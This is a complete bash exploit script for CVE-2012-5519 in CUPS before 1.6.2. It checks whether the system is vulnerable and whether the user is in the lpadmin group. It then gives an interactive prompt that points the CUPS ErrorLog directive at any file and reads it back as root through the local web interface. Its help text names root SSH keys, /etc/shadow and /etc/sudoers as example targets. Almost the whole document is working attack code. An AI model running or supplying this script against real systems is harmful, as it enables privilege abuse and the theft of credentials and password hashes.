#!/usr/bin/env bash
# exploit title: cups-root-file-read.sh
# author: p1ckzi
#         github: https://github.com/p1ckzi
#         twitter: @p1ckzi
# vendor home: https://www.cups.org/
# vulnerable software and version: CUPS < 1.6.2
# tested on: Ubuntu 20.04.3 LTS | CUPS 1.6.1
# cve: 2012-5519
# osvdb: 87635
#
# description:
# this script exploits a vulnerability in CUPS (common UNIX printing system)
#  < 1.6.2. CUPS allows users within the lpadmin group to make changes to the
# cupsd.conf file, with the cupsctl command. this command also allows the user
# to specify an ErrorLog path. when the user visits the
# '/admin/log/error_log page', the cupsd daemon running with an SUID of root
# reads the ErrorLog path and echoes it in plain text.
# in short, files owned by the root user can be read if the ErrorLog path is
# directed there.
#
# the script checks if the vulnerability exists, and if the current user has the
# ability to exploit it, and if the needed commands within the script are
# available. after passing these checks the user is provided with an interactive
# prompt where they can input an absolute path to files they want to read.

# some error handling for debugging, if needed.
set -o errexit
set -o nounset
#set -o xtrace
set -o pipefail

# magic variables. main use is for debugging, if needed.
#__dir="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
#__file="${__dir}/$(basename "${BASH_SOURCE[0]}")"
#__base="$(basename ${__file} .sh)"
#__root="$(cd "$(dirname "${__dir}")" && pwd)"
#arg1="${1:-}"

# more terminal types can be added/changed/turned off if needed.
# again, assumption is made that the script is being run though a limited shell,
# possibly over something like netcat.
#TERM=linux
TERM=xterm

# used for printing colours and information boxes for readability.
readability(){
  # colours.
  C1=$(tput setaf 1)
  C2=$(tput setaf 2)
  C3=$(tput setaf 3)
  C4=$(tput setaf 4)
  C0=$(tput sgr0)
  # information boxes.
  I1=$(printf "[!] ")
  I2=$(printf "[+] ")
  I3=$(printf "[>] ")
  I4=$(printf "[i] ")
}

# removes colours and information boxes for accessibility.
accessibility(){
  # colours.
  C1=$(tput sgr0)
  C2=$(tput sgr0)
  C3=$(tput sgr0)
  C4=$(tput sgr0)
  C0=$(tput sgr0)
  # information boxes.
  I1=''
  I2=''
  I3=''
  I4=''
}

# script is interactive only. die(), print_help(), and parse_commandline() are
# used to make sure that nothing else is passed to the script.
die()
{
  local _ret="${2:-1}"
  [[ ${_PRINT_HELP:-no} == yes ]] && print_help >&2
  printf "%s" >&2 "$1"
  exit "${_ret}"
}

print_help()
{
  printf "\n%s does not require any arguments to run." "$0"
  printf "\nit is currently interactive only."
  printf "\nusage: %s [-a|--accessible] [-h|--help]" "$0"
  printf '\n\t-a, --accessible: turns off features which may negatively affect'
  printf '\n\tscreen readers.'
  printf '\n\t-h, --help: prints this dialog message.'
  printf '\nafter passing all the required checks for the exploit,'
  printf '\nthe user will be prompted for input.'
  printf '\ntype in the full path to a file to read it.'
  printf '\neg.'
  printf '\n\t1. /root/.ssh/id_rsa'
  printf '\n\t2. /root/.bash_history'
  printf '\n\t3. /etc/shadow etc...'
  printf '\n'
}

parse_commandline()
{
  while [[ $# -gt 0 ]]; do
    _key="$1"
    case "$_key" in
      -a|--accessible)
        accessibility
        small_banner
        main
        ;;
      -a*)
        _PRINT_HELP=yes die "'$1' is not a valid argument." 1
        exit 0
        ;;
      -h|--help)
        print_help
        exit 0
        ;;
      -h*)
        print_help
        exit 0
        ;;
      *)
        _PRINT_HELP=yes die "'$1' is not a valid argument." 1
        ;;
    esac
    shift
  done
}

small_banner(){
  printf "cups-root-file-read.sh"
  printf "\na bash implementation of CVE-2012-5519 for linux."
}

banner(){
  printf "%s" "${C1}"
  printf "                                            _"
  printf "\n  ___ _   _ _ __  ___       _ __ ___   ___ | |_"
  printf "\n / __| | | | '_ \/ __|_____| '__/ _ \ / _ \| __|____"
  printf "\n| (__| |_| | |_) \__ \_____| | | (_) | (_) | ||_____|"
  printf "\n \___|\__,_| .__/|___/     |_|  \___/ \___/ \__|%s" "${C3}"
  printf "\n / _(_) | _%s|_|%s      _ __ ___  __ _  __| |  ___| |__" "${C1}"\
  "${C3}"
  printf "\n| |_| | |/ _ \_____| '__/ _ \/ _\` |/ _\` | / __| '_ \ "
  printf "\n|  _| | |  __/_____| | |  __/ (_| | (_| |_\__ \ | | |"
  printf "\n|_| |_|_|\___|     |_|  \___|\__,_|\__,_(_)___/_| |_|%s" "${C0}"
  printf "\na bash implementation of CVE-2012-5519 for linux."
}

# main requirement. checks for the 'cupsctl' command and exits if unavailable.
check_cupsctl(){
  printf "\n%schecking for cupsctl command..." "${I4}"
  if ! command -v cupsctl &> /dev/null; then
    printf "%s\n%scupsctl could not be found. exiting.%s" "${C1}" "${I1}"\
    "${C0}"
    exit 0
  else
    printf "%s\n%scupsctl binary found in path.%s" "${C2}" "${I2}" "${C0}"
  fi
}

# checks if the 'cups-config' command is available to the current user
# and which version of CUPS is running.
check_cups_version(){
  printf "\n%schecking cups version..." "${I4}"
  local check_version
  check_version=$(cups-config --version)
  local required_version='1.6.2'
  if [[ $(printf '%s\n' "$required_version" "$check_version"\
  | sort --version-sort\
  | head --lines=1) == "$required_version" ]]; then 
    printf "%s\n%susing cups %s. " "${C3}" "${I1}" "${check_version}"
    printf "exploit may not work...%s" "${C0}"
  else
    printf "%s\n%susing cups %s. " "${C2}" "${I2}" "${check_version}"
    printf "version may be vulnerable.%s" "${C0}"
  fi
}

# uses the 'groups' command to check if user is in lpadmin group
# and exits if not.
check_lpadmin(){
  printf "\n%schecking user %s in lpadmin group..." "${I4}" "${USER}"
  local group
  group=$(groups)
  local lpadmin='lpadmin'
  if [[ $group != *$lpadmin* ]]; then
    printf "%s\n%suser %s not part of lpadmin group. exiting.%s" "${C1}"\
    "${I1}" "${USER}" "${C0}"
    exit 0
  elif [[ $USER == "root" ]]; then
    printf "\n%sit appears you're already root!" "${I4}"
    printf "\n%syou probably don't need this exploit to view system files."\
    "${I4}"
  else
    printf "%s\n%suser part of lpadmin group.%s" "${C2}" "${I2}" "${C0}"

  fi
}

# checks for the 'curl' command.
check_curl(){
  printf "\n%schecking for curl command..." "${I4}"
  if ! command -v curl &> /dev/null; then
    printf "%s\n%scurl could not be found. exiting.%s" "${C1}" "${I1}" "${C0}"
    exit 0
  else
    printf "%s\n%scurl binary found in path.%s" "${C2}" "${I2}" "${C0}"
  fi
}

# informs the user if an invalid absolute path is submitted.
invalid_argument(){
  printf "%s" "${C3}"
  printf "%s'%s' is not a valid file path or command.%s" "${I1}"\
  "${interactive}" "${C0}"
  printf "\n"
  exploit_help
}

exploit_info(){
  printf "%sexploit info:" "${I4}"
  printf "\n%sthis script exploits a vulnerability in CUPS (common UNIX printing"\
  "${I4}"
  printf "\n%ssystem < 1.6.2. CUPS allows users within the lpadmin group to make"\
  "${I4}"
  printf "\n%schanges to the cupsd.conf file, with the cupsctl command. this also"\
  "${I4}"
  printf "\n%sallows the user to specify an ErrorLog path. when the user visits"\
  "${I4}"
  printf "\n%sthe '/admin/log/error_log' page, the cupsd daemon running with an"\
  "${I4}"
  printf "\n%sSUID of root reads the ErrorLog path and echoes it in plain text."\
  "${I4}"
  printf "\n%sin short, files owned by the root user can be read if the ErrorLog"\
  "${I4}"
  printf "\n%spath is directed there." "${I4}"
  external_help
}

exploit_help(){
  printf "%susage:" "${I4}"
  printf "\n\tinput must be an absolute path to an existing file."
  printf "\n\teg."
  printf "\n\t1. /root/.ssh/id_rsa"
  printf "\n\t2. /root/.bash_history"
  printf "\n\t3. /etc/shadow"
  printf "\n\t4. /etc/sudoers ... etc."
  printf "\n%s%s commands:" "${I4}" "$0"
  printf "\n\ttype 'info' for exploit details."
  printf "\n\ttype 'help' for this dialog text."
  printf "\n\ttype 'quit' to exit the script."
  external_help
}

external_help(){
  printf "\n%sfor more information on the limitations" "${I4}"
  printf "\n%sof the script and exploit, please visit:" "${I4}"
  printf "\n%shttps://github.com/0zvxr/CVE-2012-5519/blob/main/README.md"\
  "${I4}"
}

# creates a crude backup of the two directives that might need changing during
# the exploit. Reverts to them after reading from file or sets them to nothing
# if the directives were not set to begin with.
backup_cupsd(){
  prev_webint=$(cupsctl | grep "WebInterface=" || true)
  prev_errlog=$(cupsctl | grep "ErrorLog=" || true)
  if [[ -z $prev_webint ]]; then
    prev_webint='WebInterface='
  else
    true
  fi
  if [[ -z $prev_errlog ]]; then
    prev_errlog='ErrorLog='
  else
    true
  fi
}

# main part of script after passing initial checks - user prompt in while loop.
# displays warnings about the effects on system files as a result of running the
# exploit. attempts to handle unexpected information submitted by the user such
# as missing arguments, and errors from the server such as 404 status codes as a
# result of failing to include the path for the 'cupsctl ErrorLog=' command or
# unusual information that does not resemble a /path/to/file submission.
# also creates a crude backup of cupsctl directives that may need changing
# during exploitation.
interactive(){
  printf "%s\n%sall checks passed.%s" "${C2}" "${I2}" "${C0}"
  printf "%s\n\n%swarning!: this script will set the group ownership of"\
  "${C3}" "${I1}"
  printf "\n%sviewed files to user '%s'." "${I1}" "${USER}"
  printf "\n%sfiles will be created as root and with group ownership of" "${I1}"
  printf "\n%suser '%s' if a nonexistant file is submitted." "${I1}" "${USER}"
  printf "\n%schanges will be made to /etc/cups/cups.conf file as part of the"\
  "${I1}"
  printf "\n%sexploit. it may be wise to backup this file or copy its contents"\
  "${I1}"
  printf "\n%sbefore running the script any further if this is a production"\
  "${I1}"
  printf "\n%senvironment and/or seek permissions beforehand." "${I1}"
  printf "\n%sthe nature of this exploit is messy even if " "${I1}"
  printf "you know what you're looking for.%s" "${C0}"
  printf "\n\n"
  exploit_help
  backup_cupsd
  while true; do
    printf "%s\n%s%s" "${C4}" "${I3}" "${C0}"
    read -r -e -p "" interactive
    case "$interactive" in
      info)
        exploit_info
        ;;
      help)
        exploit_help
        ;;
      quit)
        printf "%squitting %s.\n" "${I4}" "$0"
        exit 0
        ;;
      *)
        # regex check to make sure the submission resembles a file path.
        valid_filepath='^(/[^/ ]*)+/?$'
        if ! [[ $interactive =~ $valid_filepath ]]\
        || [[ $interactive == */ ]]; then
          invalid_argument
        else
          # passing a directory as an argument, such as '/tmp' or '/tmp/ '
          # results in a 404 status code. the user is informed instead of
          # passing the html contents to the user.
          cupsctl WebInterface=Yes\
          && cupsctl ErrorLog="$interactive"\
          && user_input=$(curl --head --silent\
            http://localhost:631/admin/log/error_log)
          if [[ $user_input == *"404"* ]]; then
            printf "%s%sthe server is returning a 404 status code." "${C3}"\
            "${I1}"
            printf "\n%syour input may contain a nonexistent directory or perhaps"\
            "${I1}"
            printf "\n%syou have pointed towards a directory instead of a file.%s"\
            "${I1}" "${C0}"
            printf "\n%stype 'help' for examples, or" "${I4}"
            external_help
          else
            # if all conditions are met but the contents of the file are blank,
            # the user is informed the file may have been generated by the
            # exploit. cleaning up may be required for these types of files.
            user_input=$(curl --silent http://localhost:631/admin/log/error_log)
            if [[ -z $user_input ]]; then
              printf "%s%sthe file at %s is empty." "${C3}" "${I1}"\
              "${interactive}"
              printf "\n%sit may have been created by this exploit if it is new.%s"\
              "${I1}" "${C0}"
              external_help
            else
              # if all conditions are met, the contents of the file are displayed
              # to the user.
              printf "%s%scontents of %s:%s" "${C2}" "${I2}" "${interactive}"\
              "${C0}"
              printf "\n%s" "${user_input}"
            fi
          cupsctl "$prev_webint"
          cupsctl "$prev_errlog"
          fi
        fi
        ;;
    esac
  done
  
}

# checks conditions required to run the exploit script and for user to reach the
# main interactive function.
all_checks(){
  printf "\n\n%sperforming checks..." "${I4}"
  check_cupsctl
  check_cups_version
  check_lpadmin
  check_curl
}

# holds all other functions.    
main(){
  all_checks
  interactive
}
  
parse_commandline "$@"
readability
banner
main
